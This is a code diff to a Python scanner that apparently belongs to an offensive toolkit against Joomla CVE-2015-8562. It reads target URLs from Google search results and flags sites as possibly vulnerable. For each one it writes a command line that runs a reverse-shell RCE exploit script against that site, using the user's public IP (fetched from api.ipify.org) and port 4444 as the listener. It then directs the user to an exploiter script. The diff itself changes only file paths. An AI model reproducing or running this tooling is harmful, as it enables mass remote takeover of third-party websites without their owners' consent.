@@ -87,7 +87,7 @@ class Joomla_CVE_2015_8562():
                     print('[+] Possible vulnerable')
                     print('[+] Joomla: ' + joomla_version + '\n')
                     cmd = 'echo python2 joomla-rce-2-shell.py -t {0} -l {1} '\
-                          '-p {2} >> ../exploits/vuln_joomla_2015_8562.txt\n'\
+                          '-p {2} >> exploits/vuln_joomla_2015_8562.txt\n'\
                           .format(req.url, self.revshell, self.port)
                     os.system(cmd)
                 q.task_done()
@@ -119,12 +119,12 @@ class Joomla_CVE_2015_8562():
 
 
 def main():
-    filename = '../google_results.txt'
+    filename = 'results_google_search.txt'
     req = requests.get('https://api.ipify.org/'); revshell = str(req.content,'utf-8')
     port = 4444
     Joomla_CVE_2015_8562(filename, revshell, port)
     print('[+] \033[31mThe results of this parser can be exploited '
-          'by\033[33m ../exploits/exploiter.py\033[39m\n')
+          'by\033[33m exploits/exploiter.py\033[39m\n')
 
 
 if __name__ == '__main__':
